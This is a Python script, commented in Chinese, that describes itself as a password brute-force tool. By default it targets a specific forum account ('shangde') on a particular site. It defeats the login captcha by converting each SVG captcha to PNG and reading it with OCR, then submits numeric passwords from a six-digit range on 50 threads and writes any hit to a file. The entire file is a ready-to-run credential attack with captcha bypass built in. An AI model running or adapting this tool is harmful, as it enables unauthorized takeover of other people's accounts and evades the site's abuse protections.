import requests
import time
import os
import re
import logging
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime

class PasswordCracker:
    def __init__(self):
        self.base_url = os.environ.get('BASE_URL', 'https://mk48by049.mbbs.cc')
        self.target_username = os.environ.get('TARGET_USERNAME', 'shangde')
        self.api_base = f'{self.base_url}/bbs'
        self.captcha_url = f'{self.api_base}/login/captcha'
        self.login_url = f'{self.api_base}/login'
        
        # 解析密码范围
        segment = os.environ.get('PASSWORD_SEGMENT', '100000-199999')
        start, end = map(int, segment.split('-'))
        self.password_range = range(start, end + 1)
        
        # 高频配置
        self.max_workers = 50
        self.found_password = None
        self.attempts = 0
        self.start_time = time.time()
        
        # 初始化日志
        self.setup_logging()
        
        # 统计信息
        self.success_count = 0
        self.failure_count = 0
        self.captcha_failures = 0

    def setup_logging(self):
        """设置日志配置"""
        # 创建logs目录
        if not os.path.exists('logs'):
            os.makedirs('logs')
        
        # 设置日志格式
        log_filename = f"logs/password_cracker_{datetime.now().strftime('%Y%m%d_%H%M%S')}.log"
        
        logging.basicConfig(
            level=logging.INFO,
            format='%(asctime)s - %(levelname)s - %(message)s',
            handlers=[
                logging.FileHandler(log_filename, encoding='utf-8'),
                logging.StreamHandler()  # 同时输出到控制台
            ]
        )
        
        self.logger = logging.getLogger(__name__)
        self.logger.info("=" * 60)
        self.logger.info("🔐 密码爆破工具启动")
        self.logger.info("=" * 60)

    def init_ocr(self):
        """初始化OCR"""
        try:
            import ddddocr
            self.logger.info("✅ ddddocr 初始化成功")
            return ddddocr.DdddOcr(show_ad=False)
        except Exception as e:
            self.logger.error(f"❌ ddddocr 初始化失败: {e}")
            return None

    def svg_to_png(self, svg_content):
        """SVG转PNG"""
        try:
            import cairosvg
            return cairosvg.svg2png(bytestring=svg_content.encode('utf-8'))
        except Exception as e:
            self.logger.warning(f"⚠️ SVG转换失败: {e}")
            return None

    def save_password_to_file(self, password):
        """保存密码到文件"""
        try:
            with open('found_password.txt', 'w', encoding='utf-8') as f:
                f.write(f"目标用户: {self.target_username}\n")
                f.write(f"密码: {password}\n")
                f.write(f"发现时间: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
                f.write(f"爆破范围: {self.password_range[0]}-{self.password_range[-1]}\n")
                f.write(f"总尝试次数: {self.attempts}\n")
                f.write(f"成功率: {(self.success_count/self.attempts*100):.2f}%\n")
            self.logger.info(f"💾 密码已保存到 found_password.txt")
            return True
        except Exception as e:
            self.logger.error(f"❌ 保存密码文件失败: {e}")
            return False

    def log_attempt_stats(self):
        """记录尝试统计信息"""
        elapsed = time.time() - self.start_time
        rate = self.attempts / elapsed if elapsed > 0 else 0
        success_rate = (self.success_count / self.attempts * 100) if self.attempts > 0 else 0
        
        self.logger.info(f"📊 统计信息 - 尝试: {self.attempts}, 成功: {self.success_count}, "
                        f"失败: {self.failure_count}, 验证码失败: {self.captcha_failures}, "
                        f"速率: {rate:.1f}次/秒, 成功率: {success_rate:.2f}%")

    def try_password(self, password):
        """尝试单个密码"""
        if self.found_password:
            return None
            
        session = requests.Session()
        ocr = self.init_ocr()
        if not ocr:
            self.failure_count += 1
            return None
            
        self.attempts += 1
        
        try:
            # 获取验证码
            self.logger.debug(f"🔍 尝试密码: {password} - 获取验证码")
            resp = session.get(self.captcha_url, timeout=2)
            
            if resp.status_code == 200:
                data = resp.json().get('data', {})
                captcha_id, svg_data = data.get('id'), data.get('svg')
                
                if captcha_id and svg_data:
                    # 识别验证码
                    self.logger.debug(f"🔍 尝试密码: {password} - 识别验证码")
                    png_data = self.svg_to_png(svg_data)
                    if png_data:
                        captcha_text = ocr.classification(png_data)
                        captcha_text = re.sub(r'[^A-Za-z0-9]', '', captcha_text).upper()
                        
                        if captcha_text:
                            # 尝试登录
                            self.logger.debug(f"🔍 尝试密码: {password} - 提交登录")
                            login_data = {
                                'username': self.target_username,
                                'password': str(password),
                                'captcha_id': captcha_id,
                                'captcha_text': captcha_text
                            }
                            
                            resp = session.post(self.login_url, json=login_data, timeout=3)
                            
                            if resp.status_code == 200:
                                result = resp.json()
                                if result.get('success') and result.get('data'):
                                    self.success_count += 1
                                    self.logger.info(f"🎉🎉🎉 密码爆破成功! 密码: {password}")
                                    # 保存密码到文件
                                    if self.save_password_to_file(password):
                                        self.found_password = password
                                        return password
                                else:
                                    error_msg = result.get('message', '未知错误')
                                    self.logger.debug(f"❌ 登录失败 - 密码: {password}, 错误: {error_msg}")
                            else:
                                self.logger.warning(f"⚠️ HTTP错误 - 密码: {password}, 状态码: {resp.status_code}")
                        else:
                            self.captcha_failures += 1
                            self.logger.debug(f"⚠️ 验证码识别失败 - 密码: {password}")
                    else:
                        self.captcha_failures += 1
                        self.logger.debug(f"⚠️ SVG转换失败 - 密码: {password}")
                else:
                    self.captcha_failures += 1
                    self.logger.warning(f"⚠️ 获取验证码数据失败 - 密码: {password}")
            else:
                self.failure_count += 1
                self.logger.warning(f"⚠️ 验证码请求失败 - 密码: {password}, 状态码: {resp.status_code}")
                
        except requests.exceptions.Timeout:
            self.failure_count += 1
            self.logger.warning(f"⏰ 请求超时 - 密码: {password}")
        except requests.exceptions.ConnectionError:
            self.failure_count += 1
            self.logger.error(f"🔌 连接错误 - 密码: {password}")
        except Exception as e:
            self.failure_count += 1
            self.logger.error(f"💥 未知错误 - 密码: {password}, 错误: {e}")
        
        # 每50次显示详细统计
        if self.attempts % 50 == 0:
            self.log_attempt_stats()
                
        return None

    def run(self):
        """主运行函数"""
        self.logger.info(f"🚀 开始密码爆破")
        self.logger.info(f"🎯 目标用户: {self.target_username}")
        self.logger.info(f"🔢 爆破范围: {self.password_range[0]}-{self.password_range[-1]}")
        self.logger.info(f"🧵 并发线程: {self.max_workers}")
        self.logger.info(f"⏰ 开始时间: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
        self.logger.info("-" * 60)
        
        try:
            with ThreadPoolExecutor(max_workers=self.max_workers) as executor:
                futures = {executor.submit(self.try_password, pwd): pwd for pwd in self.password_range}
                
                for future in as_completed(futures):
                    result = future.result()
                    if result:
                        self.found_password = result
                        # 取消所有未完成的任务
                        for f in futures:
                            f.cancel()
                        break
        
        except KeyboardInterrupt:
            self.logger.warning("⏹️ 用户中断执行")
        except Exception as e:
            self.logger.error(f"💥 执行过程中发生错误: {e}")
        
        # 最终统计
        self.logger.info("-" * 60)
        if self.found_password:
            self.logger.info(f"✅ 爆破完成! 找到密码: {self.found_password}")
            # 确保文件已创建
            if not os.path.exists('found_password.txt'):
                self.save_password_to_file(self.found_password)
        else:
            self.logger.info("❌ 爆破完成，未找到密码")
        
        self.log_attempt_stats()
        self.logger.info(f"⏰ 结束时间: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
        self.logger.info("=" * 60)

if __name__ == "__main__":
    cracker = PasswordCracker()
    cracker.run()


